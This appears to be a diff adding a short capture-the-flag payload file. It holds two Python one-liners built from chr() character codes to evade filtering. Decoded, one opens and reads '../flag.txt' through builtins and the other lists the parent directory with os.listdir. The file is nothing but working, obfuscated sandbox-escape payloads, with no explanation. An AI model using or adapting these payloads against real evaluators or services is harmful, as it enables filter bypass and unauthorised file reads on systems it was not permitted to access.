@@ -1,0 +1,7 @@
+payload 1 (reading)
+
+getattr(getattr(__import__(chr(98)+chr(117)+chr(105)+chr(108)+chr(116)+chr(105)+chr(110)+chr(115)),chr(111)+chr(112)+chr(101)+chr(110))(chr(46)+chr(46)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)),chr(114)+chr(101)+chr(97)+chr(100))()
+
+payload 2 (searching)
+
+getattr(__import__(chr(111)+chr(115)), chr(108)+chr(105)+chr(115)+chr(116)+chr(100)+chr(105)+chr(114))(chr(46)+chr(46))
